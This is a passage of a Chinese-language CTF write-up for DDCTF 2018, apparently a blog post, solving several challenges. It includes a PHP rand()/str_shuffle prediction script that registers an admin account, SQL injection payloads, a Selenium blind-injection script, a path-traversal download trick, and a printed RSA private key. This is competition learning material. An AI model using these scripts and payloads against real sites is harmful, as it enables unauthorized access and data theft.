`identity` FROM users WHERE username = :username');\n    $sth->execute([':username' => $username]);\n\n    if ($sth->fetch()[0] === \"admin\") {\n        $_SESSION['is_admin'] = true;\n    } else {\n        $_SESSION['is_admin'] = false;\n    }\n\n    #echo $username;\n    header(\"Location: index.php\");\n}\n```\nlogin部分使用pdo进行查询，并且字符串之间的比较也是\"===\"，不可能存在任何漏洞。\n\n### register.php\n\n```\nif(!(isset($_POST['csrf']) and (string)$_POST['csrf'] === $_SESSION['csrf'])) {\n        die(\"CSRF token error!\");\n    }\n    \n    $admin = \"admin###\" . substr(str_shuffle('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'), 0, 32);\n    $username = (isset($_POST['username']) === true && $_POST['username'] !== '') ? (string)$_POST['username'] : die('Missing username');\n    $password = (isset($_POST['password']) === true && $_POST['password'] !== '') ? (string)$_POST['password'] : die('Missing password');\n    $code = (isset($_POST['code']) === true) ? (string)$_POST['code'] : '';\n    if (strlen($username) > 32 || strlen($password) > 32) {\n        die('Invalid input');\n    }\n\n    $sth = $pdo->prepare('SELECT username FROM users WHERE username = :username');\n    $sth->execute([':username' => $username]);\n\n    if ($sth->fetch() !== false) {\n        die('username has been registered');\n    }\n\n    if($code === $admin) {\n        $identity = \"admin\";\n    } else {\n        $identity = \"guest\";\n    }\n\n    $sth = $pdo->prepare('INSERT INTO users (username, password, `identity`) VALUES (:username, :password, :identity)');\n    $sth->execute([':username' => $username, ':password' => $password, ':identity' => $identity]);\n\n    echo '<script>alert(\"register success\");location.href=\"./login.php\"</script>';\n} else {\n```\n\nregister部分，使用str_shuffle生成admin密码，同时给出rand()来作为csrf值。\n\n```\n<input type=\"hidden\" name=\"csrf\" id=\"csrf\" value=\"<?php $_SESSION['csrf'] = (string)rand();echo $_SESSION['csrf']; ?>\" required>\n<label for=\"inputUsername\" class=\"sr-only\">Username</label>\n```\n\n可以想到乌云的一篇文章，也是翻译自国外，原文可以自己找[Web应用隐形后门的设计与实现](https://wooyun.js.org/drops/Web%E5%BA%94%E7%94%A8%E9%9A%90%E5%BD%A2%E5%90%8E%E9%97%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0.html)。这样的话，就可以明确思路，首先通过预测rand()值，来预测密码，在使用该密码注册一个账号，进入博客，然后通过sprintf格式化漏洞获取flag。\n\n## 解题\n现在关键就是预测rand()值，通过google，可以找到0ctf2016,有相似的题目，[http://www.vuln.cn/6004](http://www.vuln.cn/6004),文中提到，只要有大于等于32个连续的rand()随机数，就可以大概预测接下来rand()的值。\n\n```\n#!php\nstate[i] = state[i-3] + state[i-31]\nreturn state[i] % 2147483648\n```\n\n同时，需要知道一定要使用 requests.session来keep-alive，否则的话，获得的rand()值并不是连续的，也就不满足上面的公式了。\n\n此外，在获得超过32个rand()值之后，并预测到接下来的62个rand()之后，还需要重新实现str_shuffle函数。通过阅读php源码，可以找到str_shuffle函数的实现。\n\n```\nstatic void php_string_shuffle(char *str, long len TSRMLS_DC) /* {{{ */\n{\n\tlong n_elems, rnd_idx, n_left;\n\tchar temp;\n\t/* The implementation is stolen from array_data_shuffle       */\n\t/* Thus the characteristics of the randomization are the same */\n\tn_elems = len;\n\n\tif (n_elems <= 1) {\n\t\treturn;\n\t}\n\n\tn_left = n_elems;\n\n\twhile (--n_left) {\n\t\trnd_idx = php_rand(TSRMLS_C);\n\t\tRAND_RANGE(rnd_idx, 0, n_left, PHP_RAND_MAX);\n\t\tif (rnd_idx != n_left) {\n\t\t\ttemp = str[n_left];\n\t\t\tstr[n_left] = str[rnd_idx];\n\t\t\tstr[rnd_idx] = temp;\n\t\t}\n\t}\n}\n\n```\n其中RAND_RANGE函数的实现如下:\n\n```\n#define RAND_RANGE(__n, __min, __max, __tmax) \\\n(__n) = (__min) + (long) ((double) ( (double) (__max) - (__min) + 1.0) * ((__n) / ((__tmax) + 1.0)))\n\n```\n准备工作就绪，就可以编写代码了。\n代码如下:\n\n```\nimport requests\nfrom lxml import etree\n\nurl = \"http://116.85.39.110:5032/2ae51a1981cbbdef618d3c46af6199cb/register.php\"\n\ndata = {\n    'username': 'dida',\n    'password': 'dida',\n    'csrf': '2086003527',\n    'code': ''\n}\n\ndef get_csrf(html):\n    html = etree.HTML(html)\n    token = html.xpath('//*[@id=\"csrf\"]')[0].get('value')\n    return token\n\n\ndef rand_range(rand, n_left):\n     return int((n_left + 1.0) * (rand / (2147483648.0)))\n\n\ndef shuffle(calc_rand):\n    str = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n    str_temp = list(str)\n    str_len = len(str_temp)\n    n_left = str_len - 1\n    temp = \"\"\n    while n_left:\n        randdata = calc_rand[61 - n_left]\n        index = rand_range(randdata, n_left)\n        if index != n_left:\n            temp = str_temp[n_left]\n            str_temp[n_left] = str_temp[index]\n            str_temp[index] = temp\n        n_left = n_left - 1\n\n    return \"\".join(str_temp)\n\nwhile 1:\n    s = requests.session()\n    l = []\n    for i in range(33):\n        res = s.get(url)\n        token = get_csrf(res.content)\n        l.append(token)\n\n    calc_rand = []\n    temp_calc_rand = []\n    for i in range(33, 95):\n        value = (int(l[i - 31]) + int(l[i-3])) % 2147483648\n        l.append(value)\n        temp_calc_rand.append(value)\n\n    str = \"admin###\" + shuffle(temp_calc_rand)[0:32]\n    data['code'] = str\n    data['csrf'] = l[32]\n\n    res = s.post(url = url, data = data)\n    print(res.content)\n    break\n```\n运行上边的代码，就可以注册一个账号，至于该账号是不是admin,多试几次总会成功。\n\n登陆之后，就可以使用sprintf字符串格式化漏洞来进行sql注入。这个就不在赘述了。\n基本的payload如下:\n>http://116.85.39.110:5032/2ae51a1981cbbdef618d3c46af6199cb/index.php?id=%1$&title=%1$' or 2=1 union select 1,2,3%23\n\n最后得到flag: ```DDCTF{9b7ccc1e96387b5ce079adab2fb08022}```\n\n","source":"_posts/ddctf.md","raw":"---\ntitle: ddctf2018\ndate: 2018-04-20 14:45:40\ntags: ctf\n---\n# 签到题目:\n复制，粘贴\n\n# (╯°□°）╯︵ ┻━┻\n题目给了一个字符串\n```\nd4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1b2e2e5e2b5b4e4b8b7e6e1e1b6b9e4b5e3b8b1b1e3e5b5b6b4b1b0e4e6b2fd\n```\n\n首先，应该想到两两一组，一组代表一个字符，考虑到DDCTF，\"DD\"两个字符，在字符串中找到两组相邻的字符串，找到了\"c4c4\"和\"e1e1\"：\n\nd4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0<b>c4c4</b>c3d4c6fbb9e1b2e2e5e2b5b4e4b8b  7e6<b>e1e1</b>b6b9e4b5e3b8b1b1e3e5b5b6b4b1b0e4e6b2fd\n\n进一步分析可知，<b>c4</b>和<b>c3</b>刚好相差1，而<b>D</b>和<b>C</b>的ascii值也相差1，<b>c4c4</b>应该就表示\"DD\", 然后以此类推：\n\n![avatar](/images/ddctf/20180420150038.png)\n\n# 第四扩展FS\n1. 下载下来是一张图片\n\n首先:``` binwalk windows.jpg```\n\n```\nsecurity:/mnt/c/Users/HT/Desktop/ddctf$ binwalk windows.jpg\n\nDECIMAL         HEX             DESCRIPTION\n-------------------------------------------------------------------------------------------------------\n30              0x1E            TIFF image data, big-endian\n2871992         0x2BD2B8        LZMA compressed data, properties: 0x01, dictionary size: 2097152 bytes, uncompressed size: 134217728 bytes\n7236510         0x6E6B9E        Zip archive data, at least v2.0 to extract, compressed size: 20430, uncompressed size: 33350, name: \"file.txt\"\n7257054         0x6EBBDE        End of Zip archive\n\nProgress: 81.81% (10890274 / 13310878)\n```\n可以看到图片里边有个压缩包。\n这时候，可以使用`dd`或者`foremost`命令，来分离压缩包。\n\n> dd if=windows.jpg of=temp.zip skip=7236510 count=20544 bs=1  \n> foremost windows.jpg\n\n得到一个压缩包，然后，查看图片属性，会在详细信息->备注里看到一个字符串\"Pactera\"，估计就是密码。\n\n2. 然后打开file.txt\n\n![avatar](/images/ddctf/20180420151247.png)  \n可以看到有很多乱序字符，结合题目的提示，<b>日常违规审计中频次有时候非常重要</b>,可以统计一下每个字符串的个数，并排序。\n\n```\ngrep -o . file.txt | sort |uniq -c | sort -rn\n```\n\n![avatar](/images/ddctf/20180420151941.png)\n\n然后从新组合一下，就得到flag了。\n\n```\nDDCTF{ZuozHengqU3dEshi}\n```\n<!--more-->\n\n# 流量分析\n这道题，花了我很长时间，直到ddctf快结束，才做出来，可以说完全被Fl-g.zip和sqlmap.zip绕进去了，气的我都想打我自己。  \n过程如下:\n首先大体上浏览整个数据包，会发现，大体上就是3个部分:  \n\n+  ftp 发送了两个zip,Fl-g.zip和sqlmap.zip,传了一大堆数据  \n+  邮件相关的数据包\n+  https相关的包，由于只有几个，竟然被我选择性忽略了。\n\n## ftp之Fl-g.zxip\n> tcp.stream eq 2004   \n\n右键follow tcp流，保存数据，发现只有119kb，解压也提示包损坏，要密码，最终也没啥结果。\n\n然后，感觉应该是follow tcp流，没有得到所有的数据，于是，使用:\n> tcp.stream eq 2004 && ftp-data\n\n得到Fl-g.zip相关的数据包,另存为flag.pcap，然后编写代码，一个一个的拼接数据。\n\n```\nfrom scapy.all import * \npcaps = rdpcap(\"flag.pcap\")\n\nfp = open(\"flag.zip\", \"wb\")\nlength = 0\nfor pcap in pcaps:\n    value = pcap['Raw'].original\n    length += len(value)\n    fp.write(value)\nprint(length)\nfp.close()\n```\n得到13M大小的flag.zip,通过一番操作，尝试了密码爆破，伪加密，压缩包修复，来来回回折腾了几遍，最终，使用7-zip，密码:zhangsan，竟然解压得到了一个类似于mp4格式的文件，不知道这玩意和qr-code.jpg有什么关系，还没办法播放。主要原因，还是Fl-g.zip缺失了大量的数据，在明知缺失大量数据的情况下，感觉应该立即放弃，不过这压缩包名字实在太忽悠，折腾了3,4天我才放弃，浪费我大量时间。\n\n## ftp之sqlmap.zip\n> tcp.stream eq 2005\n\n既然给了这个压缩包，感觉应该会有点用（实际上:一点用没有）,首先，follow tcp流，只有163kb，于是和Fl-g.zip一样,过滤:\n> tcp.stream eq 2004 && ftp-data\n\n得到sqlmap.zip相关的数据包,另存为sqlmap.pcap，然后编写代码，一个一个的拼接数据。\n\n\n```\nfrom scapy.all import * \npcaps = rdpcap(\"sqlmap.pcap\")\n\nfp = open(\"sqlmap.zip\", \"wb\")\nlength = 0\nfor pcap in pcaps:\n    value = pcap['Raw'].original\n    length += len(value)\n    fp.write(value)\nprint(length)\nfp.close()\n```\n\n得到了一个sqlmap.zip，第一次打开，用winrar，点击工具->修复压缩文件，修复一下。然后，爆破，伪加密，又搞了一遍，我都不知道我哪来的耐心。最后，想到已知明文攻击。\n\n已知明文攻击: 已知明文攻击要求加密的压缩包和非加密的压缩包里有相同的文件，并且文件的crc32值要相同，然后就可以使用archpr这个软件进行已知明文攻击。\n\n然后，去github.com下载最新版本的sqlmap,发现文件的crc32值并不相同，需要下载sqlmap1.1.10.zip才行。最后，解压sqlmap.zip得到的文件和sql1.1.10.zip里的文件一模一样，没有一点有用的东西。\n\n## 邮件部分\n通过follow tcp流，当tcp.stream eq 2016的时候，会看到有一个image001图片:\n\n```\nContent-type: image/png; name=\"image001.png\";\n x-mac-creator=\"4F50494D\";\n x-mac-type=\"504E4766\"\nContent-ID: <image001.png@01D38B05.8079CE40>\nContent-disposition: inline;\n\tfilename=\"image001.png\"\nContent-transfer-encoding: base64\n```\n\n下边跟着一大堆base64字符串，直接复制保存到一个文件1.txt里边。\n\n```\nimport base64\n\nfp = open(\"1.txt\", \"r\")\nfp1 = open(\"file.png\", \"wb\")\n\nfp1.write(base64.b64decode(fp.read()))\n```\n\n然后，就可以得到一个file.png。\n\n![avatar](/images/ddctf/20180425151942.png)\n\n然后，就是将图片中的字符串提取出来。\n\n```\nMIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ\nLsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO\nvMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB\nAoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4\nQGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/\nQbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN\nczILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ\nZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9\nkzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN\n+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1\nAnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH\n/5pfc3AmEyRdfyx6zWUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH\n2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=\n```\n\n再结合题目的提示，应该就是RSA私钥。我找到的东西大概就这么多。\n\n一开始的思路，就是解压Fl-g.zip，得到qr-code.jpg,最后，估计用这个私钥去解密什么东西得到flag。由于这错误的思路，所以做了3,4天没做出来。\n\n## 得到flag\n今天是ddctf最后一天，\"喝杯java\"，感觉来不及做了，就又开始看这道题，百度了一下，wireshark如何使用rsa私钥解密https流量。\n\nrsa密钥也就是，保存一下就行了:\n\n```\n-----BEGIN RSA PRIVATE KEY-----\nMIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ\nLsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO\nvMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB\nAoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4\nQGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/\nQbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN\nczILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ\nZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9\nkzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN\n+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1\nAnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH\n/5pfc3AmEyRdfyx6zWUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH\n2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=\n-----END RSA PRIVATE KEY-----\n```\n\n\n![avatar](/images/ddctf/20180420184445.png)\n\n然后，查看http包，flag就出来了。\n\n![avatar](/images/ddctf/20180420183706.png)\n\n# 数据库的秘密\n## X-forwarded-for\n首先打开网页，可以看到\"非法链接，只允许来自 123.232.23.245 的访问\",很容易就想到修改X-forwarded-for, Chrome下我使用[Modheader](https://chrome.google.com/webstore/search/modheader?hl=zh-CN)插件,然后修改一下X-forwarded-for就行了\n## 寻找注入点\n既然是数据库的秘密，加上又有查询功能，应该就是sql注入了。在查看源码之后，会发现除了id,title,date三个字段之外还有一个隐藏字段author，然后就是一个一个的测试，不出意外应该是author可以注入，为了保险还是一个一个的测试一下。\n\n* id 无论输入什么，都会被转化为数字或者为空，应该是用了intval()，不存在注入点。\n* title和date均过滤了单引号，双引号，右斜杠，宽字节也不好使，估计也不好注入。\n* author\n  * \"admin\", 会得到author 为 \"admin\" 的两条记录\n  * \"admin'\", 一条记录都没有\n  * \"admin'#\", 同样会得到author 为 \"admin\" 的两条记录，那注入点应该就是这里了。\n  * \"admin' and 1=1#\", 发现会有网站防火墙拦截，应该是\"and\"被拦截，可以使用\"&&\"来替换\"and\",然后，同样会查询出两条记录。\n\n## 注入 \n找到注入点之后，就好办了。\n\n* \"admin' order by 6#\", 失败，\"admin' order by 5#\"，成功查询，那就是5列了。 \n* \"admin' union select 1,2,3,4,5#\", 被防火墙拦截，然后就是各种测试\"union select\",没能成功绕过(比赛结束之后，有师傅说可以绕过，[链接](https://github.com/Bypass007/vuln/blob/master/OpenResty/OpenResty%20uri%E5%8F%82%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E.md)，由兴趣的小伙伴可以尝试一下)。那就尝试bool注入了。\n* \"admin' && 1=(substr((select group_concat(schema_name) from information_schema.schemata),1,1)<'z')#\",成功拿到数据，接下来就是写脚本拿flag了。\n  脚本如下:\n\n```\nimport time\nfrom selenium import webdriver\nimport string\n\nstrings = string.ascii_letters + string.punctuation + string.digits\nstring_value = \",0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz{}\"\nurl=\"http://116.85.43.88:8080/EHZTYREPPGMCQLNB/dfe3ia/index.php\"\npath=\"D:\\\\python\\\\chromedriver.exe\"\ndriver = webdriver.Chrome(executable_path=path)\npayload = \"admin' && 1=(substr((select group_concat(schema_name) from information_schema.schemata),%d,1)='%s')#\"\npayload_table = \"admin' && 1=(substr((select group_concat(table_name) from information_schema.tables where table_schema='ddctf'),%d,1)='%s')#\"\npayload_column = \"admin' && 1=(substr((select group_concat(column_name) from information_schema.columns where table_name='ctf_key7'),%d,1)='%s')#\"\npayload_value = \"admin' && 1=(ord(substr((select group_concat(secvalue) from ddctf.ctf_key7),%d,1))=ord('%s'))#\"\n\ndef inject():\n    data = \"\"\n\n    driver.get(url)\n    input(\"jixu:\")\n    judge = True\n    index = 1\n    while judge:\n        judge_temp = False\n        for i in string_value:\n            payload_temp = payload_value % (index, i)\n            print(payload_temp)\n            driver.get(url)\n            driver.execute_script('document.getElementById(\"author\").type=\"text\"')\n            driver.find_element_by_id(\"author\").send_keys(payload_temp)\n            driver.find_element_by_id(\"button\").click()\n            if \"admin\" in driver.page_source:\n                data += i\n                index += 1\n                judge_temp = True\n                print(data)\n                break\n            time.sleep(1)\n        if judge_temp is not True:\n            driver.close()\n\t\t\tjudge = False\n\ninject(payload_value)\n# table_schema:  ddctf\n# tables: ctf_key7, message\n# columns: ctf_key7下: secvalue，flag就保存在sevalue里边\n```\n\n## 注意点\n*  每次请求时，js都会计算一个sig值和time值，计算方法在main.js中\n   <code>\n   eval(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p;}('e f(0,4){5 7=\\'\\';l(i m 0){n(i!=\\'c\\'){a=\\'\\';a=i+\\'=\\'+0[i];7+=a}}o k(7+4)};5 0={8:\\'\\',9:\\'\\',b:\\'\\',6:\\'\\',d:h(j v().u()/w)};e x(){0[\\'8\\']=1.2(\\'8\\').3;0[\\'9\\']=1.2(\\'9\\').3;0[\\'b\\']=1.2(\\'b\\').3;0[\\'6\\']=1.2(\\'6\\').3;5 c=f(0,4);1.2(\\'g\\').q=\"p.s?r=\"+c+\"&d=\"+0.d;1.2(\\'g\\').t()}',34,34,'obj|document|getElementById|value|key|var|date|str0|id|title|str1|author|sign|time|function|signGenerate|queryForm|parseInt||new|hex_math_enc|for|in|if|return|index|action|sig|php|submit|getTime|Date|1000|submitt'.split('|'),0,{}))  \n   </code>\n   看上去挺复杂，所以我就用selenium，这样就不用操心sig和time值了。\n\n*  由于需要修改X-forwarded-for值，可以使用代理，我这里采用了更笨的方法，在代码里可以看到:\n\n```\ndriver.get(url)\ninput(\"jixu:\")\n```\n首先先发起一次请求，启动webdriver，然后用input()阻塞，这时候，就可以在启动之后的webdriver中安装[Modheader](https://chrome.google.com/webstore/search/modheader?hl=zh-CN)插件，安装完毕，修改好X-forwarded-for之后，就可以在控制台随便输入一个数据，然后，脚本就可以欢快的执行了。\n\n# 专属链接\n## 任意文件下载\n首先F12抓包，会看到一个有意思的请求，http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28=,\"ZmF2aWNvbi5pY28=\",base64_encode之后就是\"favicon.ico\",图片的内容如下:\"you can only download .class .xml .ico .ks files\",表明应该是一个下载链接，然后就可以按照war包的格式，下载指定后缀的任意文件了。\n\n![avatar](/images/ddctf/20180421191033.png)\n\n其中需要注意的有三个文件，\n\n* _.._WEB-INF_classes_com_didichuxing_ctf_controller_user_FlagController.class,该文件的地址通过构造\"116.85.48.102:5050/flag/test/flag/DDCTF{BASD}\"或类似的链接使得网站报错即可得到。\n\n ![avatar](/images/ddctf/201804211191034.png)\n\n* _.._WEB-INF_classes_com_didichuxing_ctf_controller_user_StaticController.class,该文件的地址通过构造\"116.85.48.102:5050/image/banner/[随便一个错误的地址]\"或类似的链接使得网站报错即可得到。\n\n ![avatar](/images/ddctf/20180421191037.png)\n\n* _.._WEB-INF_classes_emails.txt_a___,这个文件按理来说是无法下载的，不过我做题的时候，还是可以下载的，可以通过\"116.85.48.102:5050/base64_encode('../../WEB-INF/classes/email.txt/a/../')\",(注意，base64_encode('../../WEB-INF/classes/email.txt/a/../')是个base64之后的字符串，我这里为了方便大家查看这么写的),就可以绕过了,是个非预期，过了几天，bug修补之后，就没办法下载了，里面的邮箱或者首页的邮箱其实都可以用，所以这个文件下载下不下都无所谓，可惜了，当时应该可以下载数据库的配置文件的，我因为拿到flag就忘记的这一茬，不然，说不定还能改别人的flag，当然我是不可能这么做滴~。\n\n## 审计代码\n\n下载下来的class文件，通过Intellij idea打开，就可以直接得到反编译之后的代码了。\n其中最重要的两个文件是FlagController.class和InitListener.class。\n\n* FlagController.class\n\n```\npublic String getFlag(@PathVariable(\"email\") String email, ModelMap model) {\n        Flag flag = this.flagService.getFlagByEmail(email);\n        return \"Encrypted flag : \" + flag.getFlag();\n    }\n```\n在该文件中，可以得到一个获取加密后的flag的路由，需要一个邮箱，当然该邮箱也是加密之后的邮箱，如何加密邮箱，可以在InitListener.class中看到。\n\n* InitListener.class\n\n```\npublic void onApplicationEvent(ApplicationEvent event) {\n        if(event.getSource() instanceof ApplicationContext) {\n            WebApplicationContext ctx = (WebApplicationContext)event.getSource();\n            if(ctx.getParent() == null) {\n                String regenflag = this.properties.getProperty(\"regenflag\");\n                if(regenflag != null && \"false\".equals(regenflag)) {\n                    System.out.println(\"skip gen flag\");\n                } else {\n                    try {\n                        this.flagService.deleteAll();\n                        int id = 1;\n                        String path = ctx.getServletContext().getRealPath(\"/WEB-INF/classes/emails.txt\");\n                        String ksPath = ctx.getServletContext().getRealPath(\"/WEB-INF/classes/sdl.ks\");\n                        System.out.println(path);\n                        String emailsString = FileUtils.readFileToString(new File(path), \"utf-8\");\n                        String[] emails = emailsString.trim().split(\"\\n\");\n                        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n                        FileInputStream inputStream = new FileInputStream(ksPath);\n                        keyStore.load(inputStream, this.p.toCharArray());\n                        Key key = keyStore.getKey(\"www.didichuxing.com\", this.p.toCharArray());\n                        Cipher cipher = Cipher.getInstance(key.getAlgorithm());\n                        cipher.init(1, key);\n                        SecretKeySpec signingKey = new SecretKeySpec(\"sdl welcome you !\".getBytes(), \"HmacSHA256\");\n                        Mac mac = Mac.getInstance(\"HmacSHA256\");\n                        mac.init(signingKey);\n                        SecureRandom sr = new SecureRandom();\n                        String[] var16 = emails;\n                        int var17 = emails.length;\n\n                        for(int var18 = 0; var18 < var17; ++var18) {\n                            String email = var16[var18];\n                            String flag = \"DDCTF{\" + Math.abs(sr.nextLong()) + \"}\";\n                            String uuid = UUID.randomUUID().toString().replace(\"-\", \"s\");\n                            byte[] data = cipher.doFinal(flag.getBytes());\n                            byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());\n                            Flag flago = new Flag();\n                            flago.setId(Integer.valueOf(id));\n                            flago.setFlag(byte2hex(data));\n                            flago.setEmail(byte2hex(e));\n                            flago.setOriginFlag(flag);\n                            flago.setUuid(uuid);\n                            flago.setOriginEmail(email);\n                            this.flagService.save(flago);\n                            System.out.println(email + \"同学的入口链接为：http://116.85.48.102:5050/welcom/\" + uuid);\n                            ++id;\n                            System.out.println(flago);\n                        }\n                    } catch (KeyStoreException var25) {\n                        var25.printStackTrace();\n                    } catch (IOException var26) {\n                        var26.printStackTrace();\n                    } catch (NoSuchAlgorithmException var27) {\n                        var27.printStackTrace();\n                    } catch (CertificateException var28) {\n                        var28.printStackTrace();\n                    } catch (UnrecoverableKeyException var29) {\n                        var29.printStackTrace();\n                    } catch (NoSuchPaddingException var30) {\n                        var30.printStackTrace();\n                    } catch (InvalidKeyException var31) {\n                        var31.printStackTrace();\n                    } catch (IllegalBlockSizeException var32) {\n                        var32.printStackTrace();\n                    } catch (BadPaddingException var33) {\n                        var33.printStackTrace();\n                    }\n\n                }\n            }\n        }\n    }\n```\n该文件中onApplicationEvent方法意思是，在应用启动之后，首先判断是否需要生成flag，如果需要生成flag，然后读取email.txt里边的邮箱一一加密，同时生成flag，并保存到数据库中。只要可以得到加密后的email.txt就可以获得加密后的flag，并通过相应的sdl.ks获取公钥，最终解密加密后的flag即可得到flag了。\n\n## 获取flag\n* 生成加密的email，随便在email.txt中获取一条email，或者首页的邮箱。\n\n```\npublic class cipher {\n    public static  void main(String[] args) throws Exception {\n        gencipher();\n//        String email = \"email\";\n//        SecretKeySpec signingKey = new SecretKeySpec(\"sdl welcome you !\".getBytes(), \"HmacSHA256\");\n//        Mac mac = Mac.getInstance(\"HmacSHA256\");\n//        mac.init(signingKey);\n//        byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());\n//        System.out.println(byte2hex(e));\n    }\n\n    public static void gencipher() throws Exception {\n        String p = \"sdl welcome you !\".substring(0, \"sdl welcome you !\".length() - 1).trim().replace(\" \", \"\");\n        String ksPath = \"D:\\\\java\\\\ddctf\\\\src\\\\main\\\\java\\\\sdl.ks\";\n        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n        FileInputStream inputStream = new FileInputStream(ksPath);\n        keyStore.load(inputStream, p.toCharArray());\n//        Key key = keyStore.getKey(\"www.didichuxing.com\", p.toCharArray());\n        Key key = keyStore.getCertificate(\"www.didichuxing.com\").getPublicKey();\n        Cipher cipher = Cipher.getInstance(key.getAlgorithm());\n        cipher.init(2, key);\n        String flag = \"019312D7231329ADEB986C6F994D7148B74AF9282B515F80F58A88BCE863F8848600CA69C4BE8F0D3BE3486B4FB7445C15169085F1DFE4D4B8439EF3472B50DE22D6E09BCCBC56542541D0C8F148B658005C2DD89202AEBF765998C2FA6AA197E5F6277587E78498F7E0A111429D3E1BEE2F4DD17224C0599FFA2FC1EE69B2521EEB96859EEB3D65DA88FED274739B208A81AF6280CF233B2064C6DB513AB9D53B010A456B8073C8C950E29034628C957108E7173390FBB4665229A6A9949188C8A5D43AE7CDB6244F082EF90EB3D2E126764CF90DE716A2150652AE3C13C0B457BD76E9BF1F9936AD85474CEDB23472039B5EC3387EF4FB5D5E3BD0FA681CDE\";\n        byte[] data = cipher.doFinal(hexStringToBytes(flag));\n        System.out.println(new String(data));\n    }\n\n    public static String byte2hex(byte[] b) {\n        StringBuilder hs = new StringBuilder();\n\n        for(int n = 0; b != null && n < b.length; ++n) {\n            String stmp = Integer.toHexString(b[n] & 255);\n            if(stmp.length() == 1) {\n                hs.append('0');\n            }\n\n            hs.append(stmp);\n        }\n\n        return hs.toString().toUpperCase();\n    }\n\n    public static byte[] hexStringToBytes(String hexString) {\n        if (hexString == null || hexString.equals(\"\")) {\n            return null;\n        }\n        hexString = hexString.toUpperCase();\n        int length = hexString.length() / 2;\n        char[] hexChars = hexString.toCharArray();\n        byte[] d = new byte[length];\n        for (int i = 0; i < length; i++) {\n            int pos = i * 2;\n            d[i] = (byte) (charToByte(hexChars[pos]) << 4 | charToByte(hexChars[pos + 1]));\n        }\n        return d;\n    }\n\n    private static byte charToByte(char c) {\n        return (byte) \"0123456789ABCDEF\".indexOf(c);\n    }\n}\n```\n通过这几行代码就可以获得一个加密后的邮箱了,邮箱使用首页展示的邮箱就行。\n\n```\n//        String email = \"email\";\n//        SecretKeySpec signingKey = new SecretKeySpec(\"sdl welcome you !\".getBytes(), \"HmacSHA256\");\n//        Mac mac = Mac.getInstance(\"HmacSHA256\");\n//        mac.init(signingKey);\n//        byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());\n//        System.out.println(byte2hex(e));\n```\n拿到该加密后的邮箱，就可以获得加密后的flag。\n\n ![avatar](/images/ddctf/20180421191047.png)\n\n拿到加密之后的flag之后，就可以解密了。\n\n```\npublic static void gencipher() throws 